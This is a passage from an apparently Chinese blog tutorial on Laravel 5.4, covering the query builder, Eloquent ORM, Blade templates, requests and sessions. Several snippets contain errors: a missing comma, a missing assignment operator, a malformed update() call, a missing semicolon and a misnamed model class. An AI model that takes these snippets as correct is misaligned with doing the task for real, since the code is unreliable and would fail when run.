'15130110067']);</span></span><br><span class=\"line\">        <span class=\"comment\">// $num = DB::delete('DELETE FROM student WHERE id &gt; ?', ['15130110067']);</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>这种方法属于原始方法，接下来有更酷的操作数据库方法</strong></p>\n<p><strong>2.查询构造器及新增数据</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test2</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $bool = DB::table(<span class=\"string\">'student'</span>)-&gt;insert([</span><br><span class=\"line\">            [<span class=\"string\">'ID'</span> =&gt; <span class=\"string\">'15130110098'</span>, <span class=\"string\">'name'</span> =&gt; <span class=\"string\">'小淳'</span>, <span class=\"string\">'sex'</span> =&gt; <span class=\"string\">'female'</span>, <span class=\"string\">'class'</span> =&gt; <span class=\"string\">'1513011'</span>,</span><br><span class=\"line\">            <span class=\"string\">'in_time'</span> =&gt; <span class=\"string\">'2015'</span>, <span class=\"string\">'status'</span> =&gt; <span class=\"string\">'stay_in'</span>]</span><br><span class=\"line\">            [<span class=\"string\">'ID'</span> =&gt; <span class=\"string\">'15130110099'</span>, <span class=\"string\">'name'</span> =&gt; <span class=\"string\">'小明'</span>, <span class=\"string\">'sex'</span> =&gt; <span class=\"string\">'female'</span>, <span class=\"string\">'class'</span> =&gt; <span class=\"string\">'1513011'</span>,</span><br><span class=\"line\">            <span class=\"string\">'in_time'</span> =&gt; <span class=\"string\">'2015'</span>, <span class=\"string\">'status'</span> =&gt; <span class=\"string\">'stay_in'</span>]</span><br><span class=\"line\">        ]);</span><br><span class=\"line\">        var_dump($bool);</span><br><span class=\"line\"></span><br><span class=\"line\">        $num = DB::table(<span class=\"string\">'student'</span>)-&gt;where(<span class=\"string\">'id'</span>, <span class=\"string\">'15130110067'</span>)-&gt;update(<span class=\"string\">'in_time'</span> =&gt; <span class=\"string\">'2016'</span>);</span><br><span class=\"line\">        var_dump($num);</span><br><span class=\"line\">        $num DB::table(<span class=\"string\">'student'</span>)-&gt;increment(<span class=\"string\">'class'</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">        var_dump($num);</span><br><span class=\"line\">        $num = DB::table(<span class=\"string\">'student'</span>)-&gt;where(<span class=\"string\">'id'</span>, <span class=\"string\">'&gt;='</span>, <span class=\"string\">'15130110067'</span>)-&gt;delete();</span><br><span class=\"line\">        var_dump($num);</span><br><span class=\"line\">        DB::table(<span class=\"string\">'student'</span>)-&gt;truncate();   <span class=\"comment\">// delete all data in table</span></span><br><span class=\"line\"></span><br><span class=\"line\">        $students = DB::table(<span class=\"string\">'student'</span>)-&gt;get();     <span class=\"comment\">// return all data</span></span><br><span class=\"line\">        dd($students);</span><br><span class=\"line\">        $student = DB::table(<span class=\"string\">'student'</span>)-&gt;orderBy(<span class=\"string\">'id'</span>, <span class=\"string\">'desc'</span>)-&gt;first();</span><br><span class=\"line\">        dd($student);</span><br><span class=\"line\">        $names = DB::table(<span class=\"string\">'student'</span>)-&gt;pluck(<span class=\"string\">'name'</span>);    <span class=\"comment\">// return name attrubite</span></span><br><span class=\"line\">        dd($names);</span><br><span class=\"line\">        $names = DB::table(<span class=\"string\">'student'</span>)-&gt;lists(<span class=\"string\">'name'</span>, <span class=\"string\">'id'</span>);  <span class=\"comment\">// return id -&gt; name(now this is removed)</span></span><br><span class=\"line\">        dd($names);</span><br><span class=\"line\">        $names = DB::table(<span class=\"string\">'student'</span>)-&gt;select(<span class=\"string\">'id'</span>, <span class=\"string\">'name'</span>, <span class=\"string\">'sex'</span>)-&gt;get();   <span class=\"comment\">// return attrubites</span></span><br><span class=\"line\">        dd($names);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;pre&gt;'</span>;</span><br><span class=\"line\">        DB::table(<span class=\"string\">'student'</span>)-&gt;chunk(<span class=\"number\">2</span>, <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">($students)</span> </span>&#123;</span><br><span class=\"line\">            var_dump($students);</span><br><span class=\"line\">        &#125;);     <span class=\"comment\">// for big data query, query 2 data every time</span></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>这个方法可以避免sql攻击注入，同时也人性化很多,还有很多内容，具体查看官方文档</strong><br><a href=\"https://laravel.com/docs/5.4/queries\" target=\"_blank\" rel=\"external\">database</a></p>\n<p><strong>3.Eloquent ORM</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">// app\\Student.php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">App</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Illuminate</span>\\<span class=\"title\">Database</span>\\<span class=\"title\">Eloquent</span>\\<span class=\"title\">Model</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Flight</span> <span class=\"keyword\">extends</span> <span class=\"title\">Model</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/**</span><br><span class=\"line\">     * The table associated with the model.</span><br><span class=\"line\">     *</span><br><span class=\"line\">     * <span class=\"doctag\">@var</span> string</span><br><span class=\"line\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $table = <span class=\"string\">'student'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $primaryKey = <span class=\"string\">'id'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// app\\Http\\Controllers\\StudentController.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">App</span>\\<span class=\"title\">Http</span>\\<span class=\"title\">Controllers</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">App</span>\\<span class=\"title\">Student</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">StudentController</span> <span class=\"keyword\">extends</span> <span class=\"title\">Controller</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $students = Student::all();</span><br><span class=\"line\">        $students = Student::find(<span class=\"string\">'15130110067'</span>)</span><br><span class=\"line\">        dd($students);</span><br><span class=\"line\"></span><br><span class=\"line\">        $student = <span class=\"keyword\">new</span> Student();</span><br><span class=\"line\">        $student-&gt;ID = <span class=\"string\">'15130110070'</span>;</span><br><span class=\"line\">        $student-&gt;name = <span class=\"string\">'小青'</span>;</span><br><span class=\"line\">        $student-&gt;sex = <span class=\"string\">'female'</span>;</span><br><span class=\"line\">        $student-&gt;class = <span class=\"string\">'1513011'</span>;</span><br><span class=\"line\">        $student-&gt;in_time = <span class=\"string\">'2015'</span>;</span><br><span class=\"line\">        $student-&gt;status = <span class=\"string\">'stay_in'</span>;</span><br><span class=\"line\">        $bool = $student-&gt;save();</span><br><span class=\"line\">        dd($bool);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ORM 正则搜索</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">search</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    $keyword = $request-&gt;keyword;</span><br><span class=\"line\">    $keyword = <span class=\"string\">'%'</span> . $keyword . <span class=\"string\">'%'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// $books = DB::select('SELECT * FROM books WHERE keywords LIKE ?', [$keyword]);</span></span><br><span class=\"line\">    $books = Book::where(<span class=\"string\">'keywords'</span>, <span class=\"string\">'LIKE'</span>, $keyword)-&gt;paginate(<span class=\"number\">12</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($books-&gt;total()) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> view(<span class=\"string\">'book.searchResults'</span>, [</span><br><span class=\"line\">            <span class=\"string\">'books'</span> =&gt; $books,</span><br><span class=\"line\">        ]);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> view(<span class=\"string\">'book.searchNoFound'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>具体内容查看官方文档</strong><br><a href=\"https://laravel.com/docs/5.4/eloquent\" target=\"_blank\" rel=\"external\">ORM</a></p>\n<h2 id=\"blade模板\"><a href=\"#blade模板\" class=\"headerlink\" title=\"blade模板\"></a>blade模板</h2><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// views\\layout.blade.php</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang=\"en\"&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=\"utf-8\"&gt;</span><br><span class=\"line\">    &lt;title&gt;laravel模板继承&lt;/title&gt;</span><br><span class=\"line\">    &lt;style&gt;</span><br><span class=\"line\">        .header &#123;</span><br><span class=\"line\">            width: 1000px;</span><br><span class=\"line\">            height: 150px;</span><br><span class=\"line\">            margin: 0 auto;</span><br><span class=\"line\">            background: #f5f5f5;</span><br><span class=\"line\">            border: 1px solid #ddd;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .main &#123;</span><br><span class=\"line\">            width: 1000px;</span><br><span class=\"line\">            height: 300px;</span><br><span class=\"line\">            margin: 0 auto;</span><br><span class=\"line\">            margin-top: 15px;</span><br><span class=\"line\">            clear: both;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .main .sidebar &#123;</span><br><span class=\"line\">            float: left;</span><br><span class=\"line\">            width: 20%;</span><br><span class=\"line\">            height: inherit;</span><br><span class=\"line\">            background: #f5f5f5;</span><br><span class=\"line\">            border: 1px solid #ddd;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .main .content &#123;</span><br><span class=\"line\">            float: right;</span><br><span class=\"line\">            width: 75%;</span><br><span class=\"line\">            height: inherit;</span><br><span class=\"line\">            background: #f5f5f5;</span><br><span class=\"line\">            border: 1px solid #ddd;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .footer &#123;</span><br><span class=\"line\">            width: 1000px;</span><br><span class=\"line\">            height: 150px;</span><br><span class=\"line\">            margin: 0 auto;</span><br><span class=\"line\">            margin-top: 15px;</span><br><span class=\"line\">            background: #f5f5f5;</span><br><span class=\"line\">            border: 1px solid #ddd;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &lt;/style&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    &lt;div class='header'&gt;</span><br><span class=\"line\">        @section('header')</span><br><span class=\"line\">        头部</span><br><span class=\"line\">        @show</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;div class='main'&gt;</span><br><span class=\"line\">        &lt;div class='sidebar'&gt;</span><br><span class=\"line\">            @section('sidebar')</span><br><span class=\"line\">            侧边栏</span><br><span class=\"line\">            @show</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">        &lt;div class='content'&gt;</span><br><span class=\"line\">            @yield('content', '主要内容')</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;div class=\"footer\"&gt;</span><br><span class=\"line\">        @section('footer')</span><br><span class=\"line\">        尾部</span><br><span class=\"line\">        @show</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// views\\student\\test.php</span><br><span class=\"line\">@extends('layout')</span><br><span class=\"line\"></span><br><span class=\"line\">@section('header')</span><br><span class=\"line\">    @parent</span><br><span class=\"line\">    header</span><br><span class=\"line\">@stop</span><br><span class=\"line\"></span><br><span class=\"line\">@section('sidebar')</span><br><span class=\"line\">    sidebar</span><br><span class=\"line\">@stop</span><br><span class=\"line\"></span><br><span class=\"line\">@section('content')</span><br><span class=\"line\">    content</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;!-- 1.模板中输出变量 --&gt;</span><br><span class=\"line\">    &lt;p&gt;&#123;&#123; $name &#125;&#125;&lt;/p&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;!-- 2.模板中调用PHP代码 --&gt;</span><br><span class=\"line\">    &lt;p&gt;&#123;&#123; time() &#125;&#125;&lt;/p&gt;</span><br><span class=\"line\">    &lt;p&gt;&#123;&#123; date('Y-m-d H:i:s', time()) &#125;&#125;&lt;/p&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;!-- 3.原样输出 --&gt;</span><br><span class=\"line\">    &lt;p&gt;@&#123;&#123; $name &#125;&#125;&lt;/p&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#123;&#123;-- 4.模板中注释 --&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#123;&#123;-- 5.引入子视图 --&#125;&#125;</span><br><span class=\"line\">    @include('student.commen', ['message' =&gt; '我是错误信息'])</span><br><span class=\"line\"></span><br><span class=\"line\">    @if ($name == 'fenlan')</span><br><span class=\"line\">        I'm fenlan</span><br><span class=\"line\">    @elseif ($name == 'hello')</span><br><span class=\"line\">        I'm hello</span><br><span class=\"line\">    @else</span><br><span class=\"line\">        Who am I?</span><br><span class=\"line\">    @endif</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;br&gt;</span><br><span class=\"line\">    @unless ($name != 'fenlan')</span><br><span class=\"line\">        I'm fenlan</span><br><span class=\"line\">    @endunless</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;br&gt;</span><br><span class=\"line\">    @for ($i=0; $i &lt; 10; $i++)</span><br><span class=\"line\">        &#123;&#123; $i &#125;&#125;</span><br><span class=\"line\">    @endfor</span><br><span class=\"line\"></span><br><span class=\"line\">@stop</span><br></pre></td></tr></table></figure>\n<h2 id=\"Requests\"><a href=\"#Requests\" class=\"headerlink\" title=\"Requests\"></a>Requests</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">App</span>\\<span class=\"title\">Http</span>\\<span class=\"title\">Controllers</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">App</span>\\<span class=\"title\">Student</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Illuminate</span>\\<span class=\"title\">Http</span>\\<span class=\"title\">Request</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">StudentController</span> <span class=\"keyword\">extends</span> <span class=\"title\">Controller</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 1.取值</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $request-&gt;input(<span class=\"string\">'name'</span>, <span class=\"string\">'default'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $request-&gt;has(<span class=\"string\">'name'</span>);</span><br><span class=\"line\">        $res = $request-&gt;all();</span><br><span class=\"line\">        dd($res);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 2.判断请求类型</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $request-&gt;method();</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $request-&gt;isMethod(<span class=\"string\">'GET'</span>);</span><br><span class=\"line\">        $res = $request-&gt;is(<span class=\"string\">'student/*'</span>);</span><br><span class=\"line\">        var_dump($res);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Session\"><a href=\"#Session\" class=\"headerlink\" title=\"Session\"></a>Session</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// routes\\web.php</span></span><br><span class=\"line\">Route::group([<span class=\"string\">'middleware'</span> =&gt; [<span class=\"string\">'web'</span>]], <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">   Route::any(<span class=\"string\">'session1'</span>, <span class=\"string\">'StudentController@session1'</span>);</span><br><span class=\"line\">   Route::any(<span class=\"string\">'session2'</span>, <span class=\"string\">'StudentController@session2'</span>);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 1.Http request session();</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session1</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\">        $request-&gt;session()-&gt;put(<span class=\"string\">'key1'</span>, <span class=\"string\">'value1'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session2</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $request-&gt;session()-&gt;get(<span class=\"string\">'key1'</span>);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 2.sesson()</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session1</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\">        session()-&gt;put(<span class=\"string\">'key2'</span>, <span class=\"string\">'value2'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session2</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> session()-&gt;get(<span class=\"string\">'key2'</span>);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 3.Session class</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session1</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\">        Session::put(<span class=\"string\">'key3'</span>, <span class=\"string\">'value3'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session2</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> session::get(<span class=\"string\">'key3'</span>, <span class=\"string\">'default'</span>);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session1</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\">        Session::push(<span class=\"string\">'student'</span>, <span class=\"string\">'fenlan'</span>);</span><br><span class=\"line\">        Session::push(<span class=\"string\">'student'</span>, <span class=\"string\">'shirk3'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session2</span><span class=\"params\">(Request $request)</span> </span>&#123;</span><br><span class=\"line\">        $res = Session::get(<span class=\"string\">'student'</span>, <span class=\"string\">'default'</span>);</span><br><span class=\"line\">        dd($res);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span 